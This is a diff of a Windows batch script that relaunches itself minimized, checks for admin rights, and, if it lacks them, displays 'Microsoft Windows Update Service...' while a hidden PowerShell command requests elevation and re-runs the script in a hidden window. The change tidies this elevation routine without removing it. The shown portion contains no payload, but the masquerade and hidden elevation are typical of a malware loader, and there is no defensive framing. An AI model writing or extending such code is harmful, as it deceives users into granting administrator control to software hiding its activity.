@@ -1,15 +1,11 @@
 @echo off
-setlocal enabledelayedexpansion
 if not "%1"=="MINIMIZED" (
     start "" /min cmd /c "%~f0" MINIMIZED %*
     exit /b
 )
 
-set "adminCheck=0"
 net session >nul 2>&1
-if %errorLevel% == 0 set "adminCheck=1"
-
-if %adminCheck% == 1 (
+if %errorLevel% == 0 (
     goto :runAsAdmin
 ) else (
     goto :requestElevation
@@ -26,9 +22,7 @@ if %adminCheck% == 1 (
     
     :tryElevate
     echo Microsoft Windows Update Service...
-    set "psCmd=powershell -noprofile -windowstyle hidden -command"
-    set "psArgs=Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
-    %psCmd% "%psArgs%"
+    powershell -noprofile -windowstyle hidden -command "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
     if %errorLevel% == 0 (
         timeout /t 2 >nul
         exit
